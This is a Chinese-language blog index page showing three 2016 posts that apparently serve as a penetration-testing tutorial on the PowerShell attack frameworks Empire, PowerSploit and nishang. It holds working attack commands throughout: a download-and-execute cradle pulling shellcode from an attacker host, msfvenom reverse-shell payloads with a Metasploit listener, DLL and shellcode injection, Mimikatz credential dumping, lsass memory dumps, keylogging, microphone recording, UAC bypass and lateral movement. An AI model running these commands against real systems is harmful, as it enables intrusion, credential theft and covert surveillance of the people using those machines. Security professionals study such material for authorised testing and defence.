<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
    

    <!--Author-->
    
        <meta name="author" content="klion">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="klion&#39;s blog"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="klion&#39;s blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>page - klion&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    主页
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    所有文章
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    关于自己
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    标签
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    分类
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    一起交流
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">klion's blog</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/10/06/empire-powershell/">
                powershell 渗透框架 [ empire篇 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-10-06</span>
            
            
            
                <span class="category">
                    <a href="/categories/powershell/">powershell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;对于 ‘empire’[确实有些老了] 想必大家也都已经不再陌生,很多人说它是’神器’,嘿嘿……原谅我一直也没搞清楚’神器’的具体定义到底是什么[虽然,我知道这对于实际渗透并没有任何卵用],也许在我有限的认知里,一直都以为只有能千里之外轻松get到目标系统的system或者root权限的shell的’0day’才叫神器,如果动不动就把某个确实好用点儿的脚本或者工具就叫神器,未免有点儿草率,也显得不稳重,不是吗,我自己有个比较野蛮的习惯,在用别人工具的时候,总是忍不住会观察,因为想尽可能理解它的内部实现[最好也是最直接的学习资料],’如果换成是我自己这代码会怎么写呢’,虽然是后知后觉,但拓展出来的思路足以让自己受益良多[站在别人的肩膀上可以走的更快,这是真的],虽然,自己并没有再把代码把它实现一遍,但对整个工具架构实现已经有了更清晰的理解和把握,到了实际用的时候自然就不一样了[更灵活点儿嘛],以后再看到类似的工具,可能一眼就能看透个百分之七八十,嘿嘿……纯粹是个人喜好哈,听过就好,废话过后,咱们说正题,今天主要是对empire中一些好用的powershell模块做些简要的使用说明,当然啦,自己已经事先把empire中的powershell模块选择性的提取了一下,因为我们的重点还是powershell,并非empire脚本本身,整个过程中也不会有任何涉及脚本自身的东西,其实,empire使用真的非常简单,命令帮助已经写的非常详细了,看看帮助相信大家很快就能上手,不过整个工具最核心的东西还是这些ps脚本[对于一个职业渗透者来讲,您应该一开始就尽量朝着你所能理解的本质去,慢慢的,一旦养成这种习惯,同一个东西,你往往能看见别人看不见的一些小细节],因为这中间有很多脚本跟之前是重复的,所以就选择性的说一些,脚本使用都非常简单,就不再一一截图了,实在是好累啊,还是那句话,关键是大家能在实际渗透中用上,别的都是扯淡<br><br></p>
<p>1,执行系统指令的相关模块[code_execution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-DllInjection.ps1    		向指定进程中注入自定义dll</div><div class="line">Invoke-ReflectivePEInjection.ps1  	反射注入 dll</div><div class="line">Invoke-Shellcode.ps1    		执行自定义shellcode</div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Invoke-MetasploitPayload.ps1   		尝试派生一个meterpreter的shell</div><div class="line">PS <span class="symbol">C:</span>\&gt; Set-ExecutionPolicy Unrestricted</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\empire\code_execution\Invoke-MetasploitPayload.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-MetasploitPayload -url <span class="symbol">http:</span>/<span class="regexp">/192.168.3.6:8080/</span></div></pre></td></tr></table></figure>
<p><img src="/img/Invoke-MetasploitPayload.jpg" alt=""><br><br><img src="/img/Invoke-MetasploitPayload res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-ShellcodeMSIL.ps1   	在powershell进程中执行shellcode,避免触发win32 api</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\empire\code_execution\Invoke-ShellcodeMSIL.ps1</div></pre></td></tr></table></figure>
<p><br></p>
<p>2,一些信息搜集模块[collection],后面的脚本就不一一截图了[累],大家可以自己根据脚本中的帮助说明进行尝试:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Get-ChromeDump.ps1  	搜集chrome浏览器的http密码数据,浏览历史等等</div><div class="line">Get-FoxDump.ps1		搜集Firefox浏览器的http密码数据,浏览历史等等</div><div class="line">Get-BrowserData.ps1 	搜集所有浏览器数据[IE,chrome,firefox],包括书签,收藏</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\empire\collection\Get-BrowserData.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-BrowserInformation -Browser All -Datatype History -UserName admin</div></pre></td></tr></table></figure></p>
<p><img src="/img/Get-BrowserData.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Get-ClipboardContents.ps1 	提前当前机器剪切板中的数据,以秒为单位,默认<span class="number">15</span>秒,实际中并未成功</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\empire\collection\Get-ClipboardContents.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke -ClipboardMonitor -CollectionLimit <span class="number">12</span></div></pre></td></tr></table></figure>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Get</span>-Keystrokes.ps1 		实时键盘记录,不太靠谱,经常会漏掉</div><div class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Import</span>-<span class="keyword">Module</span> <span class="keyword">C</span>:\empire\collection\<span class="keyword">Get</span>-Keystrokes.ps1</div><div class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Get</span>-Keystrokes</div></pre></td></tr></table></figure>
<p><img src="/img/Get-Keystrokes.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Get-Screenshot.ps1  	截图,貌似不太好使,不过前面有脚本是好使的</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\empire\collection\Get-Screenshot.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-Screenshot</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Invoke-Inveigh.ps1  	嗅探器,需要管理权限,支持LLMNR, NBNS, SMB, HTTP, <span class="keyword">and</span> HTTPS</div><div class="line">Invoke-InveighUnprivileged.ps1  	嗅探smb hash,不需要管理员权限</div><div class="line">Invoke-NetRipper.ps1 	尝试从指定的浏览器进程中导出https明文密码数据,曾经黑帽大会的经典工具</div><div class="line">Out-Minidump.ps1     	相当于prodump -ma 免杀抓hash,缺点文件较大</div></pre></td></tr></table></figure>
<p><br></p>
<p>3,抓各种密码的方式[credentials]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Get-VaultCredential.ps1从Vault	获取各种密码</div><div class="line">Invoke-CredentialInjection.ps1	类似wce的hash注入</div><div class="line">Invoke-Mimikatz.ps1</div><div class="line">Invoke-PowerDump.ps1</div><div class="line">Invoke-TokenManipulation.ps1	窃取令牌</div><div class="line">Invoke-DCSync.ps1</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>4,提权[privesc]及bypasuac的各种方法:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Invoke-MS16032.ps1  	可能不太好使</div><div class="line">Invoke-WScriptBypassUAC.ps1</div><div class="line">Invoke-BypassUAC.ps1</div><div class="line">Get-SiteListPassword.ps1</div><div class="line">Invoke-WScriptBypassUAC.ps1</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>5,各种内网渗透相关模块 [situational_awareness]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Invoke-SmbScanner.ps1  	全自动smb弱口令扫描</div><div class="line">Invoke-Portscan.ps1	tcp端口扫描</div><div class="line">Invoke-ARPScan.ps1	内网arp扫描</div><div class="line">Get-SPN.ps1</div><div class="line">Invoke-WinEnum.ps1</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>6,横向渗透[lateral_movement],拓展内网的其它机器:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-PsExec.ps1		powershell版的psexec</div><div class="line">Invoke-SSHCommand.ps1		powershell版本的ssh工具,可以利用它方便的ssh到内网的linux机器上</div><div class="line">Invoke-InveighRelay.ps1 	经典的smb重放攻击</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>7,持久控制 [persistence]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Install-SSP.ps1</div><div class="line">Invoke-BackdoorLNK.ps1  	软连接后门</div><div class="line">Get-SecurityPackages.ps1</div><div class="line">PowerBreach.ps1</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>8,一些内网web中间件利用:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Exploit-Jenkins.ps1</div><div class="line">Exploit-JBoss.ps1</div></pre></td></tr></table></figure></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/10/06/powersploit/">
                powershell 渗透框架 [ PowerSploit篇 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-10-06</span>
            
            
            
                <span class="category">
                    <a href="/categories/powershell/">powershell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
<p><br></p>
<p>1,命令执行类模块[CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/invoke shellcode.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">可以看到,当我们注入自己的payload之后meterpreter被正常弹回</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-Shellcode.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">'http://192.168.3.6/shell.txt'</span>)</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Shellcode -Shellcode @($buf) -ProcessId <span class="number">6284</span></div></pre></td></tr></table></figure>
<p><img src="/img/invoke shellcode res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiCommand.ps1  适用于批量在远程机器上执行系统指令,暂时还有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-WmiCommand.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Hosts = Get-Content <span class="symbol">C:</span>\host.txt</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Payload = Get-Content <span class="symbol">C:</span>\shell.ps1  问题就在这个payload上</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Credential = Get-Credential <span class="string">'TargetDomain\TargetUser'</span> 指定账号,它会提示你输入密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Hosts <span class="params">| Invoke-WmiCommand -Payload $Payload -Credential $Credential</span></div></pre></td></tr></table></figure>
<p><img src="/img/invoke wmicommand.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-DllInjection.ps1 将自己的dll注入到目标机器的指定进程中,务必以administrator或者system权限操作,这里就一个弹回以meterpreter为例</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f dll -o /root/Desktop/shell.dll</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lport <span class="number">1234</span></div><div class="line">msf exploit(handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">3.6</span></div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-DllInjection.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-DllInjection -ProcessID <span class="number">5560</span> -Dll shell.dll 这里的<span class="number">5560</span>是explorer.exe的进程id,最好不要注入到这个进程里,容易把资源管理器搞崩溃</div></pre></td></tr></table></figure>
<p><img src="/img/invoke dllinjection.jpg" alt=""><br><br><img src="/img/invoke dllinjection res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Invoke-ReflectivePEInjection.ps1 	远程注入dll,同样,也有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-ReflectivePEInjection.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; $PEBytes = [IO.File]<span class="symbol">:</span><span class="symbol">:ReadAllBytes</span>(<span class="string">'c:\shell.dll'</span>)</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName <span class="number">2008</span>R2DC</div></pre></td></tr></table></figure>
<p><br></p>
<p>2,各种信息搜集模块[Exfiltration]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">截屏 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-TimedScreenshot.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-TimedScreenshot -Path <span class="symbol">c:</span>\temp\ -Interval <span class="number">5</span> -EndTime <span class="number">11</span><span class="symbol">:</span><span class="number">23</span>  每<span class="number">5</span>秒截一次图,到<span class="number">11</span><span class="symbol">:</span><span class="number">23</span>时结束</div></pre></td></tr></table></figure></p>
<p><img src="/img/get timedscreenshot.jpg" alt=""><br><br><img src="/img/get timedscreenshot res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">键盘记录,如果是直接用弹回来的meterpreter再开的cmd[shell],直接在那里面用bypass选项执行脚本不太好使</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-Keystrokes.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-Keystrokes -LogPath <span class="symbol">C:</span>\temp\key.log -Timeout <span class="number">2</span>  记录<span class="number">2</span>分钟</div></pre></td></tr></table></figure>
<p><img src="/img/get keystrokes.jpg" alt=""><br><br><img src="/img/get keystrokes res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取Windows vault 中保存的各种密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-VaultCredential.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-VaultCredential</div></pre></td></tr></table></figure>
<p><img src="/img/get vaultscredential.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在域控中查找 registry.xml文件中的自动登录信息[账号密码],还有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-GPPAutologon.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-GPPAutolgon</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">同上,在域控中搜索groups.xml,scheduledtasks.xml,services.xml和datasources.xml文件中的明文账户密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-GPPPassword.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-GPPPassword -Server rootkit.org</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用目标机器的麦克风进行录音,然后存到把音频文件存到指定的路径下,当然,前提是目标外设必须要有麦克风才行,这个对个人机会很有用</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-MicrophoneAudio.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-MicrophoneAudio -Path <span class="symbol">c:</span>\temp\secret.wav -Length <span class="number">10</span> -Alias <span class="string">"tokesn"</span>  录制<span class="number">10</span>秒,然后放到<span class="symbol">c:</span>\temp目录下</div></pre></td></tr></table></figure>
<p><img src="/img/Get-MicrophoneAudio.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-TokenManipulation.ps1通常配合Invoke-CredentialInjection.ps1一起使用,一个用来窃取令牌另一个用来注入该令牌</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">powershell版的mimikatz套件,大家都已经非常熟悉了,这里就不细说了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Mimikatz -Command <span class="string">"privilege::debug sekurlsa::logonpasswords exit"</span> 抓取系统本地的用户密码明文及hash</div></pre></td></tr></table></figure>
<p><img src="/img/invoke-mimikatz.jpg" alt=""><br><br><img src="/img/invoke-mimikatz res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">导出进程数据,免杀抓hash,跟prodump -ma的功能基本一致,想必大家早已经用烂了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Out-Minidump.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-Process lsass <span class="params">| Out-Minidump -DumpFilePath C:\temp</span></div></pre></td></tr></table></figure>
<p><img src="/img/out-minidump.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">powershell版的shadowcopy,接下来去里面拷你想拷的文件就好了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\VolumeShadowCopyTools.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; New-VolumeShadowCopy -Volume <span class="symbol">C:</span>\  表示你想对那个分区执行shadowcopy操作</div></pre></td></tr></table></figure>
<p><br></p>
<p>3,提权相关的一些模块[Privesc]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">将当前线程令牌提到system</div><div class="line"><span class="symbol">C:</span>\&gt;powershell -sta   这里必须要以sta模式运行powershell</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Privesc\Get-System.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-System</div></pre></td></tr></table></figure></p>
<p><img src="/img/Get-System.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">执行提权的各种检查,要检查的内容比较多,如,可执行文件权限,服务运行权限,检查可被劫持的dll位置,检查AlwaysInstallElevated[非授权用户已system运行msi],其它各种可以被利用的注册表项,以及能搜到的各种密码等等……,可直接把检查的结果重定向到指定文件中,对于win提权来讲,绝逼好用,后续有时间我们再单独把它拿出来说</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Privesc\PowerUp.ps1 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-AllChecks <span class="params">| Out-File pri_info.txt</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>4,内网信息搜集的一些小模块[Recon]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">端口扫描,结果可能比较多可以选择把它重定向到指定的文件中,速度虽然不算太快,但也不慢,精度还可以,不过,比用什么专业的端口扫描机器要靠谱多了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Recon\Invoke-Portscan.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Portscan -Hosts <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span> -T <span class="number">4</span> -Ports <span class="string">"21,22,23,80,1433,1521,3306,3389"</span> <span class="params">| Out-File port_info.txt</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/invoke portscan.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dns反向解析[其实类似于ip反查],由ip查出所对应的域名,对于定位内网指定机器会很好用</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Recon\Invoke-ReverseDnsLookup.ps1 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-ReverseDnsLookup <span class="string">'192.168.3.20-192.168.3.24'</span></div></pre></td></tr></table></figure>
<p><img src="/img/invoke reversednslookup.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一样还是通过这种方式,我们可以直接把整个网段存活机器所对应的机器名都跑出来,在域中无疑非常方便,比单纯的net view&amp;批处理还会更好一些</div><div class="line">PS <span class="symbol">C:</span>\&gt; Write-Output <span class="string">"192.168.3.0/24"</span> <span class="params">| Invoke-ReverseDnsLookup</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>5,最后,还有一些辅助性的模块<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Out-CompressedDll.ps1   编码并压缩指定的dll</div><div class="line">Out-EncodedCommand.ps1  对ps进行编码</div><div class="line">Out-EncryptedScript.ps1 加密脚本,可以用它来给脚本设置密码[可带盐]</div></pre></td></tr></table></figure></p>
<p><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/10/05/nishang/">
                powershell 渗透框架 [nishang篇]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-10-05</span>
            
            
            
                <span class="category">
                    <a href="/categories/powershell/">powershell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;注意,powershell只针对win7以后的系统,此之前的系统是没有引入powershell的,至于powershell是什么,这里就不废话了,大家自行谷歌,在使用各种powrshell脚本的过程中,系统权限自然也是越高越好,权限大一些效果可能会更佳,至于为什么会选择powershell,想必大家早已心知肚明,免杀,可直接跟系统api交互,方便定制……这里就不啰嗦了,说破天,我们最终的目的也是希望能在实际渗透中把它用起来,不然,价值何在呢<br><br></p>
